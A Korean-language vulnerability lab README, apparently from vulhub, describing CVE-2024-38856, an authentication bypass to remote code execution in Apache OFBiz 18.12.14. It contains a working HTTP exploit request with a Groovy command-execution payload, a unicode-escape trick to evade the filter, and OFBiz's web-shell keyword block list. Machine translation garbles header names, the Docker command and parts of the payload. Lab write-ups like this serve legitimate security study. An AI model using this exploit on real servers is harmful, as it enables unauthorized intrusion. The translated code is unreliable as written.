# Apache OFBIZ 인증 우회로 인해 RCE가 발생합니다(CVE-2024-38856)
# 이 환경은 window에서 동작합니다.

[ENGLISH(영어 버전)](README_en.md)
[中文版本(중국어 버전)](README.zh-cn.md)


Apache OFBIZ는 오픈 소스 엔터프라이즈 리소스 플래닝(ERP) 시스템입니다. 이 시스템은 기업의 많은 비즈니스 프로세스를 통합하고 자동화하는 일련의 엔터프라이즈 애플리케이션을 제공합니다.

이 취약점은 [CVE-2023-51467](https://github.com/vulhub/vulhub/tree/master/ofbiz/CVE-2023-51467) 의 불완전한 수정으로 인해 발생합니다. Apache OFBIZ 버전 18.12.11에서는 개발자들이 취약점을 수정했다고 생각하지만, 실제로는 이를 악용하는 한 가지 방법만 다루었습니다. Groovy 표현식 주입은 여전히 존재하며 권한이 없는 사용자가 서버에서 임의의 명령을 실행할 수 있도록 합니다.

참고 자료:

- <https://github.com/apache/ofbiz-framework/commit/31d8d7 >
- <https://forum.butian.net/article/524 >
- <https://github.com/Praison001/CVE-2024-38856-ApacheOfBiz >

## 취약한 환경

다음 명령을 실행하여 Apache OfBiz 18.12.14 서버를 시작합니다:

```
도커 구성
```

잠시 기다린 후 'https://localhost:8443/accounting'에서 로그인 페이지를 확인할 수 있습니다.

## 취약성 재현

Groovy 스크립트에서 'id' 명령을 실행하기 위해 다음 요청을 보냅니다:

```
POST /webtools/control/main/ProgramExport HTTP/1.1
호스트: 로컬호스트:8443
수락 인코딩: gzip, 디플레이트, br
수락: */*
Accept-Language: en-US;q=0.9,en;q=0.8
사용자 에이전트: Mozilla/5.0(Windows NT 10.0, Win64, x64) AppleWebKit/537.36(KHTML, Gecko와 같은) Chrome/126.0.6478.127 Safari/537.36
연결: 닫기
캐시 제어: 최대 연령=0
콘텐츠 유형: 멀티파트/폼 데이터; boundary=----WebKitFormBoundaryDbR7sY3IIwQX7kcJ
콘텐츠 길이: 190

------WebKitFormBoundaryDbR7sY3IIwQX7kcJ
콘텐츠 배치: 양식 데이터; 이름="그루비 프로그램"

새 Exception('id'.\\u0065xecute(.text);
------WebKitFormBoundaryDbR7sY3IIwQX7kcJ--
```

![](1.png)

Apache Ofbiz는 다음 키워드의 사용을 제한하지만, 유니코드 문자인 '\\u0065xecute'를 사용하면 이 제한을 피할 수 있습니다.

```
거부된 WebShellTokens=java., beans, freemarker,<script,javascript,<body,body,<form,<jsp:,<c:out,taglib,<prefix,<%@ 페이지,<?php,execute (,alert(,\\\
%eval,@eval,eval (,runtime, 가져오기, passthru, 쉘_exec, assert, str_rot13, 시스템, decode, include, 페이지,\\
chmod, mkdir, fopen, fclose, 새 파일, upload, getfilename, download, getoutputstring, readfile, iframe, 객체, embed, 온로드, 빌드,\\
python, perl ,/perl, ruby ,/ruby , 프로세스, 기능, 클래스, InputStream, to_server, wget , static,assign, webappPath,\\
ifconfig, route, crontab, netstat, uname, hostname, iptables, whoami,"cmd",*cmd|,+cmd|,=cmd|,localhost, thread, require, gzdeflate,\\
실행, 인쇄, calc, 터치, calculate
```